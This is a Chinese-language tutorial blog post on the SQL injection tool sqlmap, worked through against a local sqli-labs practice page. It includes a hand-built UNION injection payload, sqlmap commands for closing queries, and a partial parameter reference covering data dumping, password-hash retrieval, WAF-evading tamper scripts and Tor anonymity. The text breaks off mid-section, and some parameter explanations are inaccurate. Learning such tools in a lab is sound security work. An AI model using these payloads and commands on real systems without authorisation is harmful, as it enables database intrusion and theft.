        <content type="html"><![CDATA[<p>本文学习SQLMAP工具的使用。<br>以及附录的SQLMAP参数百科全书。</p><a id="more"></a><h2 id="一、SQLMAP介绍"><a href="#一、SQLMAP介绍" class="headerlink" title="一、SQLMAP介绍"></a>一、SQLMAP介绍</h2><p>SQLMAP是一种开源渗透测试工具，可自动执行SQL注入缺陷的检测和开发过程，并接管数据库服务器。它有强大的检测引擎,针对不同类型的数据库提供多样的渗透测试功能选项，实现数据库识别、数据获取、访问DBMS\操作系统甚至通过带外数据连接的方式执行操作系统的命令。以及从数据库指纹识别、从数据库获取数据、访问底层文件的广泛范围的交换机通过带外连接在操作系统上执行命令。</p><p><strong>SQLMAP支持的数据库</strong>：MySQL, Oracle,PostgreSQL,Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库。</p><p>SQLMAP目前支持的注入方式：</p><ul><li>B：布尔型注入（Boolean-base blind SQL injection）</li><li>E：报错型注入（Error-based SQL injection）</li><li>U：可联合查询注入（UNION query SQL injection）</li><li>S：可多语句查询植入（Stacked queries SQL injection）</li><li>T：基于时间延迟注入（Time-base blind SQL injection）</li><li>Q：内联注入（Inline SQL injection）</li></ul><p>SQLMAP功能模块</p><table><thead><tr><th>目标</th><th>至少为目标提供一选项</th></tr></thead><tbody><tr><td>请求（Request）</td><td>指定如何连接目标URL的方法</td></tr><tr><td>优化（Optimization）</td><td>优化SQLMAP的性能</td></tr><tr><td>注入（Injection）</td><td>指定测试哪些参数，提供注入Payload和篡改脚本</td></tr><tr><td>侦测（Detection）</td><td>侦测阶段的定制化</td></tr><tr><td>技巧（Techniques）</td><td>调整特定SQL注入技术的技巧</td></tr><tr><td>枚举（Enumeration）</td><td>枚举后端数据库管理系统信息、数据表的数据接口</td></tr><tr><td>暴力执行（Brute Force）</td><td>暴力检查</td></tr><tr><td>用户定义注入函数（User-defined Function Injection）</td><td>建立用户定义函数</td></tr><tr><td>访问文件系统（File System Access）</td><td>访问后端数据库管理系统的底层文件系统</td></tr><tr><td>操作系统连接（Operating System Access）</td><td>连接后端DBMS底层的操作系统</td></tr><tr><td>Windows注册表连接（Windows Registry Access）</td><td>连接后端DBMS底层的Windows注册表</td></tr><tr><td>通用（General）</td><td>设置一些通用参数</td></tr></tbody></table><h2 id="二、SQLMAP下载与安装"><a href="#二、SQLMAP下载与安装" class="headerlink" title="二、SQLMAP下载与安装"></a>二、SQLMAP下载与安装</h2><p>SQLMAP下载地址：<a href="http://sqlmap.org/">http://sqlmap.org/</a></p><p>查看SQLMAP是否安装 python3 sqlmap.py -h 如下图则已完成SQLMAP工具安装</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd8jc9neldj31240u0499.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd8jc9neldj31240u0499.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200327153430204"></p><h2 id="三、SQLMAP命令练习"><a href="#三、SQLMAP命令练习" class="headerlink" title="三、SQLMAP命令练习"></a>三、SQLMAP命令练习</h2><p>命令拆解</p><p><code>python sqlmap.py -u &quot;http:127.0.0.1:8999/Less-1/?id=1&quot; -user-agent=websecurity -threads=5 -p id --level --technique=E --current=user --flush-session --beep</code>  </p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdbv6gilvoj31ky0d2dn0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdbv6gilvoj31ky0d2dn0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330125655149"></p><p><code>python sqlmap.py -u &quot;http:127.0.0.1:8999/Less-1/?id=1&quot;</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc2ohwy0oj31hy09e7wh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc2ohwy0oj31hy09e7wh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330171627205"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc2otpq97j31hq0a8b29.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc2otpq97j31hq0a8b29.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330171645415"></p><h4 id="SQLMAP注入流程"><a href="#SQLMAP注入流程" class="headerlink" title="SQLMAP注入流程"></a>SQLMAP注入流程</h4><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc2q9o99qj31g10u07wh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc2q9o99qj31g10u07wh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330171807960"></p><h4 id="SQLMAP注入技巧"><a href="#SQLMAP注入技巧" class="headerlink" title="SQLMAP注入技巧"></a>SQLMAP注入技巧</h4><h5 id="需要用到-的情况："><a href="#需要用到-的情况：" class="headerlink" title="需要用到*的情况："></a>需要用到<code>*</code>的情况：</h5><ol><li>URL中的值，SQLMAP默认不注入，需要<code>*</code>指定</li><li>JSON格式，SQLMAP会无效，需要<code>*</code>才能进行</li><li>在默认Level=1时，可以使用<code>*</code>对特定的请求头做注入</li></ol><p>命令1：<code>python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=*1 --flush-session --batch --technique=B</code></p><p>命令2：<code>python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1* --flush-session --batch --technique=B</code></p><h5 id="如果不指定user-agent时，将会带有sqlmap标记。"><a href="#如果不指定user-agent时，将会带有sqlmap标记。" class="headerlink" title="如果不指定user-agent时，将会带有sqlmap标记。"></a>如果不指定user-agent时，将会带有sqlmap标记。</h5><h5 id="prefix和suffix"><a href="#prefix和suffix" class="headerlink" title="prefix和suffix"></a>prefix和suffix</h5><p>修改Less-1源代码</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc6s3018bj30zg0ae4ol.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc6s3018bj30zg0ae4ol.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330193816184"></p><p>手动构造注入语句：</p><p><code>http://127.0.0.1:8999/Less-1/?id=id=-4436)))) UNION ALL SELECT NULL,CONCAT(0x716b627171,current_user(),0x717a627671),NULL--+</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc6vmr4jij31la0gcdkf.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc6vmr4jij31la0gcdkf.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330194140960"></p><p>利用SQLMAP工具注入：</p><p><code> python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1 --flush-session --batch --technique=U</code></p><p>无法得到注入点</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc82jhdwzj30ye03agtg.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc82jhdwzj30ye03agtg.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330202253029"></p><p>需要使用<code>--prefix</code>和<code>--suffix</code>来使得语句的闭合，保证正常的Payload注入</p><blockquote><p>–prefix -&gt; )))) 闭合前面的符号</p><p>–suffix -&gt; –hhh 注释、闭合后面的数据</p></blockquote><p><code> python sqlmap.py -u http://127.0.0.1:8999/Less-1/?id=1 --flush-session --batch --technique=U --prefix=&quot;))))&quot; --suffix=&quot;-- hh&quot;</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdc883c70cj30yw0cc1kx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdc883c70cj30yw0cc1kx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330202816224"></p><h5 id="payload检测原理"><a href="#payload检测原理" class="headerlink" title="payload检测原理"></a>payload检测原理</h5><p>Payload中几个常用参数</p><ul><li>–no-cast cast() 关闭cast函数的使用</li><li>–np-escape char() 关闭char() 减少载荷，加快效率</li><li>–hex() 有时候字符编码问题可能会导致数据缺失，可以用hex()函数来避免</li></ul><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdcastikauj326u0u0x6p.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gdcastikauj326u0u0x6p.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200330215723032"></p><h5 id="risk和level"><a href="#risk和level" class="headerlink" title="risk和level"></a>risk和level</h5><p>level是测试范围，risk是语句深度</p><p>两者都会影响Payload的测试量，值越大，量越大。</p><p>level解释：高等级level会包含低等级level的测试</p><ul><li>level&gt;=2时，会测试cookie</li><li>level&gt;=3时，会测试user-agent，referer</li><li>level&gt;=5时，会测试HOST</li></ul><p>risk解释：高等级risk会包含低等级risk的测试</p><ul><li>1 默认，会测试大部分的测试语句</li><li>2 会加上基于事件的测试语句</li><li>3 会增加OR语句的SQL注入测试</li></ul><hr><h2 id="附录：SQLMAP-Wiki"><a href="#附录：SQLMAP-Wiki" class="headerlink" title="附录：SQLMAP Wiki"></a>附录：SQLMAP Wiki</h2><p>对上述提到了十二个SQLMAP功能模块，我们从实战的角度将功能重新分成Options、Target、Request、Optimization、Injection、Detection、Techniques、Fingerprint、Enumeration、Brute Force、User-defined Function Injection、File System Access、Operating System Access、Windows Registry Access、General、Miscellaneous共十六个模块来讲解。</p><p>（部分参数未能理解含义，见谅。若对参数有别的见解可以联系我呀！！！）</p><h4 id="3-1-Options（选项）"><a href="#3-1-Options（选项）" class="headerlink" title="3.1 Options（选项）"></a>3.1 Options（选项）</h4><table><thead><tr><th>参数</th><th align="left">解释</th></tr></thead><tbody><tr><td><strong>-h-hh</strong></td><td align="left"><strong>查看帮助</strong></td></tr><tr><td>–version</td><td align="left">查看版本</td></tr><tr><td><strong>-v</strong></td><td align="left"><strong>显示信息级别，共有六级：0.只显示Python错误和一些严重信息 1.显示基本信息（默认）2.显示Debug信息 3.显示注入过程的Payload 4.显示HTTP包请求 5.显示HTTP响应头 6.显示HTTP响应页面</strong></td></tr></tbody></table><h4 id="3-2-Target（目标）"><a href="#3-2-Target（目标）" class="headerlink" title="3.2 Target（目标）"></a>3.2 Target（目标）</h4><p>这些选项可用于指定连接何种目标（数据库、URL、文件）。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-d</td><td>直接连接目标后端数据库，并不使用SQL注入漏洞，通过目标端口侦听实现。需要注意的是输入目标数据库的账号与密码。例如<code>-d &quot;mysql;//username;password@127.0.01:3306/databasename&quot; --dbs</code></td></tr><tr><td>-u</td><td>指定URL连接。例如<code>-u &quot;www.implanck.com/index.php?id=1&quot;</code></td></tr><tr><td>-l</td><td>SQLMAP扫描log文件中所有记录。例如<code>-l log.txt</code></td></tr><tr><td>-x</td><td>站点地图，返回给SQL一个XML文件</td></tr><tr><td>-m</td><td>提供包含URL的TXT文件，SQLMAP会自动化检查其中所有URL。例如<code>-m target.txt</code></td></tr><tr><td>-r</td><td>提供包含POST请求方式的数据包的TXT文件，SQLMAP会通过POST方式检测目标。例如<code>-r post.txt</code></td></tr><tr><td>-g</td><td>使用Google搜索类似的网站。例如<code>-g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></td></tr><tr><td>-c</td><td>提供命令的TXT文件，让SQLMAP执行文件中的命令。也可以配合<code>--sava</code>命令将结果写入文件。</td></tr></tbody></table><h4 id="3-3-Request（请求）"><a href="#3-3-Request（请求）" class="headerlink" title="3.3 Request（请求）"></a>3.3 Request（请求）</h4><p>这些选项可用于指定如何连接到目标 URL。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–method=METHOD</td><td>指定利用GET方法还是POST方法。例如<code>--method=GET</code>或<code>--method=POST</code></td></tr><tr><td>–data=DATA</td><td>指定后接参数（POST型）。例如<code>-u &quot;www.implanck.com/index.php&quot; --data=&quot;id=1&quot; union select 1,2,3&quot;</code></td></tr><tr><td>–param-del=PARA</td><td>指定使用的变量分隔符。例如<code>-u &quot;www.implanck.com/index.php?id=1&quot; data=&quot;name=1;pass=2&quot; --para-del=&quot;;&quot;</code></td></tr><tr><td>–cookie=COOKIE</td><td>指定使用的cookie。例如<code>-u &quot;www.implanck.com/index.php?id=1&quot; --cookie=&quot;a=1;b=2&quot;</code></td></tr><tr><td>–cookie-del=COO..</td><td>与–param-del=PARA类似，不再赘述。</td></tr><tr><td>–load-cookies=L..</td><td>从Netscape/wget格式的cookie文件中加载cookie</td></tr><tr><td>–drop-set-cookie</td><td>SQLMAP默认开启set-cookie功能（当收到一条含有set-cookie的HTTP包时，下次SQL会使用新的cookie进行发包）。如果使用这条命令则关闭此功能。</td></tr><tr><td>–user-agent=AGENT</td><td>指定user-agent值测试。SQLMAP默认会使用自己的user-agent值（SQLMAP自身user-agent为<code>sqlmap/1.0-dev-nongit-201603020a89(http://sqlmap.org)</code>）进行测试。例如<code>--user-agent=&quot;aaaaaa&quot;</code></td></tr><tr><td>–random-agent</td><td>使用随机user-agent值测试。可在sqlmap/data/txt/user-agents.txt中查看。</td></tr><tr><td>–host=HOST</td><td>指定HTTP包中的HOST头参数。例如<code>--host=&quot;aaaaa&quot;</code></td></tr><tr><td>–referer=REFERER</td><td>指定HTTP包中的referer字段。例如<code>--referer=&quot;aaaaa&quot;</code></td></tr><tr><td>-H –headers</td><td>额外的headers头。例如<code>--headers=&quot;www.implanck.com\nUser-Agent:planck&quot;</code></td></tr><tr><td>–headers=HEADERS</td><td>同上面(注意构造HTTP包区分大小写)。另一个例子<code>--headers=&quot;Accept-Language:fr\nTag:213&quot;</code></td></tr><tr><td>–auth-type=AUTH..</td><td>基于HTTP身份验证的种类（共有三种认证方式）。例如<code>--auth-type Basic.Digest/NTLM</code></td></tr><tr><td>–auth-cred=AUTH..</td><td>使用认证。例如<code>--auth-type Basic --auth-cred &quot;user:password&quot;</code></td></tr><tr><td>–auth-file=AUTH..</td><td>使用.PEM文件认证。例如<code>--auth-file=&quot;AU.PEM&quot;</code></td></tr><tr><td>–ignore-code=IG..</td><td>无视响应HTTP状态码。例如<code>--ignore-code=401</code></td></tr><tr><td>–ignore-proxy</td><td>无视本地设置的代码。</td></tr><tr><td>–ignore-redirects</td><td>无视HTTP重定向（状态码为3XX类型）。可以使用这个忽略登录成功会跳转到其他网页。</td></tr><tr><td>–ignore-timeouts</td><td>无视连接超时</td></tr><tr><td><strong>–proxy=PROXY</strong></td><td>设置代理。方便BurpSuite抓包。例如<code>--proxy=&quot;127.0.0.1:8080&quot;</code></td></tr><tr><td>–proxy-cred=PRO..</td><td>代理需要认证。例如<code>--proxy=&quot;name:password&quot;</code></td></tr><tr><td>–proxy-file=PRO..</td><td>使用文件加载代理</td></tr><tr><td>–tor</td><td>可用来屏蔽一个互联网用户的IP地址，允许匿名浏览。</td></tr><tr><td>–tor-port=TORPORT</td><td>设置默认的匿名浏览端口</td></tr><tr><td>–tor-type=TORTYPE</td><td>设置匿名浏览代理种类</td></tr><tr><td>–check-tor</td><td>检查是否正确使用匿名浏览</td></tr><tr><td>–delay=DELAY</td><td>每次发包的延时时间，单位为秒。例如<code>--delay 2.5</code></td></tr><tr><td>–timeout=TIMEOUT</td><td>设置请求超时时间，默认为30秒</td></tr><tr><td>–retries=RETRIES</td><td>设置超时重连次数，默认为3。例如<code>--retries=5</code></td></tr><tr><td>–randomize=RPARAM</td><td>设置随机参数长度（保证类型与输入值一致的情况下）。为了避免反复提交同一个参数引起服务器怀疑。</td></tr><tr><td>–safe-url=SAFEURL</td><td>与<code>-u</code>类似，额外功能是防止长时间不通讯服务器销毁session，开启这种功能会隔一段时间发一个包保持session</td></tr><tr><td>–safe-post=SAFE..</td><td>同上。以POST形式发送</td></tr><tr><td>–safe-req=SAFER..</td><td>同上。从一个文件获取目标</td></tr><tr><td>–safe-freq=SAFE..</td><td>频繁发送错误请求，服务器会销毁session。开启此参数后，发几次错误的就会有发一次对的。适用于盲注</td></tr><tr><td>–skip-urlencode</td><td>跳过URL编码。（有些网站URL不遵守RFC标准编码）</td></tr><tr><td>–csrf-token=CSR..</td><td>保持CSRF令牌的token</td></tr><tr><td>–csrf-url=CSRFURL</td><td>访问URL地址时获取CSRF的token</td></tr><tr><td>–force-ssl</td><td>强制使用SSL</td></tr><tr><td>–hpp</td><td></td></tr><tr><td>–eval=EVALCODE</td><td>指定执行一段Python代码。例如<code>-u &quot;www.test.com/index.php?id=1&quot; -eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></td></tr></tbody></table><h4 id="3-4-Optimization（优化）"><a href="#3-4-Optimization（优化）" class="headerlink" title="3.4 Optimization（优化）"></a>3.4 Optimization（优化）</h4><p>这些选项可用于优化SQLMAP的性能。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-o</td><td>开启<code>--predict-output</code>、<code>--keep-alive</code>、<code>--null-connection</code>功能</td></tr><tr><td>–predict-output</td><td>根据服务器返回值来猜测一个数据表存不存在。（与暴力破解不同的是在一个范围内慢慢缩小暴力破解范围）</td></tr><tr><td>–keep-alive</td><td>使用HTTP长链接，<strong>优点：</strong>性能更好，避免重复建立链接的开销；<strong>缺点：</strong>占用服务器资源。（注意：与–proxy不兼容）</td></tr><tr><td>–null-connection</td><td>分析返回报文页面的Length值，通常用于（时间延迟&amp;布尔）盲注。</td></tr><tr><td>–threads=THREADS</td><td>开启多线程，线程数为1-10。（注意：与–predict-output不兼容）</td></tr></tbody></table><h4 id="3-5-Injection（注入）"><a href="#3-5-Injection（注入）" class="headerlink" title="3.5 Injection（注入）"></a>3.5 Injection（注入）</h4><p>这些选项可用于指定需要测试的参数，并提供自定义注入脚本和可选的篡改脚本。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-p TESTPARAMETER</td><td>指定测试的参数（使用此参数会使得<code>--level</code>参数无效）。例如<code>-p &quot;user-agent,referer&quot;</code></td></tr><tr><td>–skip=SKIP</td><td>排除指定的参数。例如<code>--level 5 --skip=&quot;id,user-agent&quot;</code></td></tr><tr><td>–skip-static</td><td>跳过测试静态参数</td></tr><tr><td>–param-exclude=..</td><td>使用正则表达式跳过测试参数</td></tr><tr><td>–dbms=DBMS</td><td>指定目标数据库类型。例如<code>--dbms=&quot;MySQL&lt;5.0&gt;/Oracle&lt;lli&gt;/Microsoft SQL Server&lt;2005&gt;&quot;</code></td></tr><tr><td>–dbms-cred=DBMS..</td><td>数据库的登录认证。例如<code>--dbms-cred=&quot;name:passwd&quot;</code></td></tr><tr><td>–os=OS</td><td>指定目标操作系统。例如<code>--os=&quot;Linux/Windows&quot;</code></td></tr><tr><td>–invalid-bignum</td><td>通常情况下SQLMAP使用负值使得参数失效（id=-1）。开启这条参数后使用大数来失效（id=9999999999）。</td></tr><tr><td>–invalid-logical</td><td>利用逻辑运算符使得参数失效。例如id=1 and 1=2（and后面失效）</td></tr><tr><td>–invalid-string</td><td>利用随机字符串使得参数失效</td></tr><tr><td>–no-cast</td><td>获取数据时，SQLMAP将所有数据转换成字符串（空格使用NuLL代替）。</td></tr><tr><td>–no-escape</td><td>用于混淆和避免出错（单引号可能会被过滤机制拦截），SQLMAP使用char()编码。例如<code>select &quot;a&quot;</code>–&gt;<code>select char(97)</code></td></tr><tr><td>–prefix=PREFIX</td><td>指定Payload前缀（有时候我们猜到了服务器代码闭合情况，需要使用这个来指定）。例如<code>-u &quot;www.implanck/com/index.php?id=1&quot; -p id --prefix&quot;)&quot; --suffix &quot;and (&#39;abc&#39;=&#39;abc&quot;</code></td></tr><tr><td>–suffix=SUFFIX</td><td>同上</td></tr><tr><td>–tamper=TAMPER</td><td>使用SQLMAP自带的tamper，或者自己写的tamper，来混淆Payload。通常用来绕过WAF和IPS。</td></tr></tbody></table><h4 id="3-6-Detection（侦测）"><a href="#3-6-Detection（侦测）" class="headerlink" title="3.6 Detection（侦测）"></a>3.6 Detection（侦测）</h4><p>这些选项可用于在侦测阶段时的自定义内容。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–level=LEVEL</td><td>设置测试等级（1-5，默认为1） lv2:cookie; lv3:user-agent,referer; lv5:host。具体的Payload可以在sqlmap/data/xml/payloads文件夹里查看。</td></tr><tr><td>–risk=RISK</td><td>风险（1-4，默认为1）升高风险等级会增加数据被篡改的风向 risk2:基于事件的测试 ；risk3:or语句的测试 ；risk4:update的测试</td></tr><tr><td>–string=STRING</td><td>指定字符串参数为判断结果真。（在基于布尔注入中，有时候返回的页面一次一个样，需要我们自己判断返回正确页面的标志，于是就设置返回正确页面的字符串）</td></tr><tr><td>–not-string=NOT..</td><td>同上。指定NULL为真。</td></tr><tr><td>–regexp=REGEXP</td><td>同上。指定正则表达式来判断。</td></tr><tr><td>–code=CODE</td><td>指定HTTP返回码为判断结果真</td></tr><tr><td>–text-only</td><td>指定页面内一段文本内容为判断结果真</td></tr><tr><td>–titles</td><td>指定页面标题为判断结果真</td></tr></tbody></table><h4 id="3-7-Techniques（技巧）"><a href="#3-7-Techniques（技巧）" class="headerlink" title="3.7 Techniques（技巧）"></a>3.7 Techniques（技巧）</h4><p>这些选项可用于选取特定 SQL 注入技术。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–technique=TECH</td><td>指定所使用的技术（B：布尔盲注、E：报错注入、U：联合查询注入、S：文件系统，操作系统，注册表相关注入、T：时间延时盲注。默认全部使用）</td></tr><tr><td>–time-sec=TIMESEC</td><td>在基于时间延迟盲注时，指定判断时间，默认5秒（单位为秒）</td></tr><tr><td>–union-cols=UCOLS</td><td>联合查询尝试列数。（类似于ORDER BY x），随着level增加，最多支持50列。例如<code>--union-cols 6-9</code></td></tr><tr><td>–union-char=UCHAR</td><td>联合查询默认使用的站列的是NULL，有的时候NULL可能会失效，因此可以手动指定其他字符。例如<code>--union-char 1</code></td></tr><tr><td>–union-from=UFROM</td><td>联合查询从之前的查询结果中选择列</td></tr><tr><td>–dns-domain=DNS..</td><td>指定DNS服务器来提升效率。例如<code>--dns-domain abc.com</code></td></tr><tr><td></td><td>在某个页面注入的结果在另一个页面展示。例如<code>--second-order www.implanck.com/a.php</code></td></tr></tbody></table><h4 id="3-8-Fingerprint（指纹）"><a href="#3-8-Fingerprint（指纹）" class="headerlink" title="3.8 Fingerprint（指纹）"></a>3.8 Fingerprint（指纹）</h4><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-f, –fingerprint</td><td>指纹信息，返回DBMS，操作系统，架构，补丁等信息</td></tr></tbody></table><h4 id="3-9-Enumeration（枚举）"><a href="#3-9-Enumeration（枚举）" class="headerlink" title="3.9 Enumeration（枚举）"></a>3.9 Enumeration（枚举）</h4><p>这些选项可用于枚举表中后端数据库管理系统信息、结构和数据。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-a, –all</td><td>暴力查找全部</td></tr><tr><td>-b, –banner</td><td>返回数据库管理系统的标识</td></tr><tr><td>–current-user</td><td>返回当前用户</td></tr><tr><td>–current-db</td><td>返回当前数据库</td></tr><tr><td>–hostname</td><td>返回主机名</td></tr><tr><td>–is-dba</td><td>检测 DBMS 当前用户是否为 DBA（数据库管理员）</td></tr><tr><td>–users</td><td>返回所用用户名</td></tr><tr><td>–passwords</td><td>返回用户密码的哈希值</td></tr><tr><td>–privilege</td><td>列举当前用户的权限（通过用户权限可以判断是否为管理员）。例如<code>--privileges U root</code></td></tr><tr><td>–roles</td><td>列举当前用户权限</td></tr><tr><td>–dbs</td><td>返回目标服务器中数据库信息</td></tr><tr><td>–tables</td><td>返回目标数据库中数据表信息</td></tr><tr><td>–columns</td><td>返回目标数据表中列字段信息</td></tr><tr><td>–schema</td><td>返回目标服务器中所有（数据库、数据表、列字段）信息</td></tr><tr><td>–count</td><td>返回查询结果的个数</td></tr><tr><td>–dump</td><td>返回指定范围的所有信息。例如<code>-D security -T users --dump</code></td></tr><tr><td>–dump-all</td><td>返回所有信息。</td></tr><tr><td>–search</td><td>搜索数据库、数据表和列字段的名称</td></tr><tr><td>–comments</td><td>检索数据库的备注</td></tr><tr><td>-D DB</td><td>查询指定某个数据库数据</td></tr><tr><td>-T TBL</td><td>查询指定某个数据表数据</td></tr><tr><td>-C COL</td><td>查询指定某个列字段数据</td></tr><tr><td>-X EXCLUDE</td><td>指定数据库的标识符</td></tr><tr><td>-U USER</td><td>指定用户（通常与其他参数联合使用）</td></tr><tr><td>–exclude-sysdbs</td><td>排除系统数据库</td></tr><tr><td>–pivot-column=P..</td><td></td></tr><tr><td>–where=DUMPWHERE</td><td>在dump时使用where条件限制</td></tr><tr><td>–start=LIMITSTART</td><td></td></tr><tr><td>–stop=LIMITSTOP</td><td></td></tr><tr><td>–first=FIRSTCHAR</td><td></td></tr><tr><td>–last=LASTCHAR</td><td></td></tr><tr><td>–sql-query=QUERY</td><td>执行SQL语句</td></tr><tr><td>–sql-shell</td><td>创建一个SQL的shell</td></tr><tr><td>–sql-file=SQLFILE</td><td>执行给定文件中的SQL语句</td></tr></tbody></table><h4 id="3-10-Brute-Force（暴力执行）"><a href="#3-10-Brute-Force（暴力执行）" class="headerlink" title="3.10 Brute Force（暴力执行）"></a>3.10 Brute Force（暴力执行）</h4><p>这些选项可用于暴力检查。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–common-tables</td><td>检查整个数据库中有没有记录信息的数据库/表。（在MySQL&gt;=5.0时，名为information_schema的数据表，存储了整个数据库的基本信息）</td></tr><tr><td>–common-columns</td><td>检查整个数据库中有没有记录列字段信息的公共表。</td></tr></tbody></table><h4 id="3-11-User-defined-Function-Injection（用户定义注入函数）"><a href="#3-11-User-defined-Function-Injection（用户定义注入函数）" class="headerlink" title="3.11 User-defined Function Injection（用户定义注入函数）"></a>3.11 User-defined Function Injection（用户定义注入函数）</h4><p>这些选项可用于用户定义注入函数。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–udf-inject</td><td></td></tr><tr><td>–shared-lib=SHLIB</td><td></td></tr></tbody></table><h4 id="3-12-File-System-Access（访问文件系统）"><a href="#3-12-File-System-Access（访问文件系统）" class="headerlink" title="3.12 File System 